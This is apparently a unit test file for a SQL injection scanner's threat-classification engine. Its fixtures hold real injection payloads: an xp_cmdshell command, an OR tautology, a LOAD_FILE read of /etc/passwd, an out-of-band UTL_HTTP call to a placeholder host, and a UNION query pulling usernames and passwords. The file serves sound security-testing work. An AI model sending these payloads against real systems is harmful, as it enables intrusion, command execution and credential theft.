import { describe, it, expect } from 'vitest';
import { ThreatConsequenceEngine } from '../../src/services/sqlScanner/engine/ThreatConsequenceEngine';
import { SqlScanFinding } from '../../src/types/sqlScanner';

describe('ThreatConsequenceEngine Unit Tests', () => {
  it('classifies OS Command Injection when stacked queries or execution bridges are present', () => {
    const finding: Partial<SqlScanFinding> = {
      title: 'Stacked Query SQL Injection',
      injectionType: 'Stacked-query indicator',
      parameterName: 'cmd_id',
      dbms: 'Microsoft SQL Server',
      reproductionRequest: "'; EXEC master..xp_cmdshell 'whoami'--",
    };

    const consequence = ThreatConsequenceEngine.analyzeThreat(finding);
    expect(consequence.threatClassification).toBe('OS_COMMAND_INJECTION');
    expect(consequence.threatBadge).toContain('OS COMMAND INJECTION');
    expect(consequence.severityLevel).toBe('Critical');
    expect(consequence.technicalImpact.some((i) => i.includes('operating system binaries'))).toBe(true);
  });

  it('classifies Authentication Bypass when login/session parameters or tautologies are present', () => {
    const finding: Partial<SqlScanFinding> = {
      title: 'Boolean-Based Blind SQL Injection',
      injectionType: 'Boolean-based',
      parameterName: 'TrackingId',
      parameterLocation: 'cookie',
      dbms: 'PostgreSQL',
      evidence: [
        {
          id: 'ev-1',
          title: 'Tautology test',
          timestamp: Date.now(),
          injectionType: 'Boolean-based',
          parameterName: 'TrackingId',
          parameterLocation: 'cookie',
          payload: "' OR '1'='1",
          baselineStatus: 200,
          baselineLength: 500,
          baselineDurationMs: 50,
          testStatus: 200,
          testLength: 600,
          testDurationMs: 50,
          rawRequest: '',
          rawResponse: '',
          analysisSummary: 'Observed Welcome back marker',
        },
      ],
    };

    const consequence = ThreatConsequenceEngine.analyzeThreat(finding);
    expect(consequence.threatClassification).toBe('AUTHENTICATION_BYPASS');
    expect(consequence.threatBadge).toContain('AUTHENTICATION BYPASS');
    expect(consequence.consequenceTitle).toContain('Authentication Bypass');
    expect(consequence.technicalImpact.some((i) => i.includes('authentication'))).toBe(true);
  });

  it('classifies Arbitrary File Read when file read primitives are detected', () => {
    const finding: Partial<SqlScanFinding> = {
      title: 'Error-Based SQL Injection',
      injectionType: 'Error-based',
      parameterName: 'filepath',
      dbms: 'MySQL',
      reproductionRequest: "' AND 1=LOAD_FILE('/etc/passwd')--",
    };

    const consequence = ThreatConsequenceEngine.analyzeThreat(finding);
    expect(consequence.threatClassification).toBe('FILE_SYSTEM_READ');
    expect(consequence.threatBadge).toContain('ARBITRARY FILE READ');
    expect(consequence.consequenceTitle).toContain('File Disclosure');
  });

  it('classifies Out-of-Band SSRF when OAST/DNS exfiltration is detected', () => {
    const finding: Partial<SqlScanFinding> = {
      title: 'Out-of-Band (OAST) SQL Injection (Oracle)',
      injectionType: 'Out-of-Band (OAST)',
      parameterName: 'tracking_num',
      dbms: 'Oracle',
      reproductionRequest: "' AND (SELECT UTL_HTTP.REQUEST('http://oast.sentinel.local') FROM DUAL)--",
    };

    const consequence = ThreatConsequenceEngine.analyzeThreat(finding);
    expect(consequence.threatClassification).toBe('SSRF_OOB');
    expect(consequence.threatBadge).toContain('SSRF');
    expect(consequence.consequenceTitle).toContain('Cloud Metadata SSRF');
  });

  it('classifies Full Database Exfiltration and formats live extracted proof snippet', () => {
    const finding: SqlScanFinding = {
      id: 'finding-1',
      title: 'UNION-Based SQL Injection',
      severity: 'Critical',
      confidence: 'Confirmed',
      confidenceScore: 100,
      confidenceBreakdown: { score: 100, level: 'Confirmed', factors: [] },
      injectionType: 'UNION-based',
      parameterName: 'category',
      parameterLocation: 'query',
      url: 'https://vulnerable.target/filter?category=Gifts',
      httpMethod: 'GET',
      dbms: 'PostgreSQL',
      detectionMethod: 'UNION Canary Oracle',
      evidence: [],
      reproductionRequest: "GET /filter?category=Gifts' UNION SELECT username, password FROM users-- HTTP/1.1\r\nHost: vulnerable.target\r\n\r\n",
      remediation: 'Use parameterized queries',
      cwe: 'CWE-89',
      owaspCategory: 'A03:2021-Injection',
      timestamp: Date.now(),
    };

    const sampleRows = [
      { username: 'administrator', password: 'secretPassword123!' },
      { username: 'carlos', password: 'carlosPassword456' },
    ];

    ThreatConsequenceEngine.enrichFinding(finding, undefined, sampleRows);

    expect(finding.threatClassification).toBe('DATA_EXFILTRATION');
    expect(finding.consequence?.threatBadge).toContain('MASS DATA EXFILTRATION');
    expect(finding.proofDetails?.proofType).toContain('UNION');
    expect(finding.proofDetails?.extractedProofSnippet).toContain('2 Row(s) Exfiltrated');
    expect(finding.proofDetails?.extractedProofSnippet).toContain('administrator');
    expect(finding.proofDetails?.reproductionCurl).toContain('curl -i -s -k "https://vulnerable.target/filter?category=Gifts"');
  });
});
